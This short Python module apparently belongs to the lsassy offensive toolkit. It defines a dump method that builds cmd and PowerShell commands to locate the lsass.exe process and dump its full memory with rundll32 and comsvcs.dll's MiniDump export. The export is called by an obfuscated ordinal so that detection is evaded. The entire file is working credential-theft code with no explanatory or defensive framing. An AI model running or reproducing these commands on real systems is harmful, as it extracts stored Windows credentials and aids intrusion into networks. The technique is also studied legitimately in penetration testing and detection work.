from lsassy.dumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):

    need_debug_privilege = True


    def get_commands(self):
        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+0000^24 ^%B {}{} full""".format(
            self.dump_path, self.dump_name)

        pwsh_command = """rundll32.exe C:\\Windows\\System32\\comsvcs.dll, #+0000^24 (Get-Process lsass).Id {}{} full""".format(
            self.dump_path, self.dump_name)
        
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
